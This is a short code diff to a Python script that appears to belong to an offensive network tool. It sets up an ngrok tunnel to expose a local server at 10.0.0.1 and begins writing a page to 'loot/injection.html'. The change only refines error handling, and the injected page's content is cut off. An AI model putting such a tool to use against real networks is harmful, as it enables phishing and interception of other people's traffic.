@@ -351,15 +351,20 @@ server=8.8.8.8
 
     public_url = "http://10.0.0.1"
     if use_ngrok:
-        print("🚀 Launching Ngrok tunnel on port 80...")
+        print(" Launching Ngrok tunnel on port 80...")
         subprocess.Popen(["./ngrok", "http", "80"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         time.sleep(5)
         try:
             res = requests.get("http://localhost:4040/api/tunnels")
-            public_url = res.json()["tunnels"][0]["public_url"]
-            print(f"Ngrok Public URL: {public_url}")
-        except:
-            print("❌ Failed to get Ngrok URL. Falling back to local IP.")
+            tunnels = res.json().get("tunnels", [])
+            if tunnels:
+                public_url = tunnels[0].get("public_url", "http://10.0.0.1")
+                print(f" Ngrok Public URL: {public_url}")
+            else:
+                raise Exception("No Ngrok tunnels found.")
+        except Exception as e:
+            print(f" Failed to get Ngrok URL: {e}")
+            print(" Falling back to local IP: http://10.0.0.1")
 
     with open("loot/injection.html", "w") as f:
         f.write(f"""<html><body>
